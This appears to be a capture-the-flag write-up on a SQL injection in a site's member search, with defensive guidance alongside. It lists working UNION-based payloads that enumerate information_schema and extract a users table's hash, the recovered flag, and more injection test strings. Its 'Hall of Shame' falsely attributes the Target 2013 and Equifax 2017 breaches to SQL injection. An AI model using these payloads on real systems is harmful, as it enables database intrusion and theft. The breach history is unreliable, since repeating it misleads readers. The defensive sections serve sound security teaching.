# 💉🗄️ SQL Injection Attack (Database Exploitation)

> **OWASP Category:** A03:2021 – Injection  
> **Severity:** 🔴 Critical  
> **Difficulty:** 🟡 Medium

The website's member search functionality contains a SQL injection vulnerability that allows attackers to manipulate database queries. By injecting malicious SQL code into the search field, attackers can bypass authentication, extract sensitive data, and potentially gain complete control over the database.

🎯 **The Crown Jewel:** SQL injection remains one of the most devastating web vulnerabilities - direct access to your data!

---

## 🎯 Exploit Technique

### 🔧 Attack Evolution

#### 🥇 **Step 1 - Basic Injection Discovery**
```sql
-- Test basic injection
Input: 1 OR 1=1

-- Result: Returns all users (4 different users)
-- Confirms SQL injection vulnerability exists
```

#### 🥈 **Step 2 - Database Schema Enumeration**
```sql
-- Discover all tables in the database
Input: 5 UNION SELECT table_name, table_schema FROM information_schema.tables

-- Result: Lists all database tables and schemas
-- Identifies target tables for further exploitation
```

#### 🥉 **Step 3 - Column Structure Analysis**
```sql
-- Enumerate all columns in all tables
Input: 5 UNION SELECT column_name, table_name FROM information_schema.columns

-- Result: Reveals 8 different fields in the 'users' table
-- Maps out complete database structure
```

#### 🏆 **Step 4 - Data Extraction & Flag Recovery**
```sql
-- Extract sensitive data from specific columns
Input: 5 UNION SELECT countersign, Commentaire FROM users

-- Result:
-- First name: 5ff9d0165b4f92b14994e5c685cdce28
-- Surname: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
```

**Final Flag Recovery Process:**
1. 🔓 **Hash Decryption** - Decrypt `5ff9d0165b4f92b14994e5c685cdce28`
2. 🔤 **Text Transformation** - Convert result to lowercase
3. 🔐 **SHA256 Hashing** - Apply SHA256 to get final flag
4. 🎉 **Success** - Flag: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

**Complete Attack Chain:**
1. 🔍 **Vulnerability Discovery** - Basic SQL injection confirmed
2. 🗄️ **Database Mapping** - Schema and table enumeration
3. 📊 **Structure Analysis** - Column identification and targeting
4. 💎 **Data Extraction** - Sensitive information retrieval
5. 🔓 **Cryptographic Processing** - Hash decryption and encoding
6. 🎯 **Flag Achievement** - Final objective completed

---

## 🛠️ Security Implementation

### ❌ vs ✅ Comparison

| 🚫 **Vulnerable Implementation** | ✅ **Secure Implementation** |
|--------------------------------|----------------------------|
| Direct SQL string concatenation | Parameterized queries/prepared statements |
| User input directly in queries | Input validation and sanitization |
| Database error messages exposed | Generic error handling |
| Excessive database permissions | Principle of least privilege |

### 🔒 Defense Strategies

**Input Validation & Query Security:**
- [ ] **💉 Parameterized Queries** - Use prepared statements exclusively
- [ ] **🧹 Input Sanitization** - Validate and clean all user input
- [ ] **🚫 Error Message Filtering** - Never expose database structure
- [ ] **🔍 Whitelist Validation** - Only allow expected input patterns

**Database Security Architecture:**
- [ ] **👤 Least Privilege Access** - Minimal database permissions
- [ ] **🔐 Connection Security** - Encrypted database connections
- [ ] **📊 Query Monitoring** - Log and analyze database queries
- [ ] **🛡️ Database Firewall** - Filter malicious query patterns

**Secure Implementation Example:**
```php
// Vulnerable Code - String concatenation
$query = "SELECT * FROM users WHERE id = " . $_POST['id'];
$result = mysqli_query($connection, $query);

// Secure Code - Parameterized queries
$stmt = $pdo->prepare("SELECT firstname, surname FROM users WHERE id = ?");
$stmt->execute([$_POST['id']]);
$user = $stmt->fetch();

// Additional validation
$id = filter_input(INPUT_POST, 'id', FILTER_VALIDATE_INT);
if ($id === false || $id <= 0) {
    die("Invalid input");
}
```

---

## ⚠️ Risk Assessment & Impact

### 🎭 Attack Scenarios by Severity

| Risk Level | Attack Vector | Business Impact | Example |
|------------|---------------|----------------|---------|
| 🔴 **Critical** | Complete database access | Total data breach | All customer records exposed |
| 🟠 **High** | Administrative bypass | System compromise | Admin account takeover |
| 🟡 **Medium** | Data manipulation | Data integrity loss | Records modified or deleted |
| 🟢 **Low** | Information disclosure | Privacy violations | Limited data exposure |

### 📈 Famous SQL Injection Attacks

#### 🏆 Hall of Shame
- **🏪 Target Corporation (2013)**  
  *Impact:* 40M+ credit card records stolen  
  *Cost:* $200M+ in damages and fines  
  *Method:* Point-of-sale SQL injection

- **💳 Equifax (2017)**  
  *Impact:* 147M+ consumer records breached  
  *Cost:* $1.4B+ in settlements  
  *Vector:* Web application SQL injection

---

## 🧠 Security Mindset

### 💭 Key Principles

> 🔐 **Golden Rule #1:** "Never trust user input - validate everything"

> 💉 **Golden Rule #2:** "Parameterized queries are your first line of defense"

> 🛡️ **Golden Rule #3:** "Defense in depth - layer your security controls"

---

## 🚨 Detection & Monitoring

### 🔍 Warning Signs
- SQL keywords in input parameters (`UNION`, `SELECT`, `OR 1=1`)
- Multiple consecutive database queries from same IP
- Attempts to access `information_schema` tables
- Unusual result set sizes from queries
- Database errors in application logs

### 📊 Monitoring Implementation
```bash
# Monitor SQL injection attempts
grep -E "(UNION|SELECT|INSERT|DELETE|DROP)" /var/log/apache2/access.log

# Detect information_schema access
grep "information_schema" /var/log/apache2/access.log

# Alert on suspicious patterns
awk '/SELECT.*FROM.*WHERE/ && /(OR.*=|UNION)/' /var/log/apache2/access.log
```

---

## 🛡️ Testing & Validation

### 🔧 Security Assessment Checklist
- [ ] Test all input fields for SQL injection
- [ ] Verify parameterized queries implementation
- [ ] Check database error message handling
- [ ] Validate database user permissions
- [ ] Test UNION-based injection techniques
- [ ] Assess information_schema access restrictions

### 🎯 Testing Methodology
```sql
-- Basic injection tests
Input: ' OR 1=1 --
Input: ' UNION SELECT 1,2,3 --
Input: ' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --

-- Advanced enumeration
Input: ' UNION SELECT table_name, column_name FROM information_schema.columns --
```

---

## 🔗 Learning Resources

### 📚 Educational Materials
- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

### 🛠️ Practice Platforms
- **DVWA** - Damn Vulnerable Web Application
- **SQLi Labs** - Comprehensive SQL injection challenges
- **WebGoat** - OWASP educational platform

### 🔧 Testing Tools
- **🔥 SQLMap** - Automated SQL injection testing
- **🧰 Burp Suite** - Manual testing and analysis
- **🕷️ OWASP ZAP** - Security scanning

---

*Remember: SQL injection is still the #1 web application vulnerability - defend accordingly! 💉🛡️* 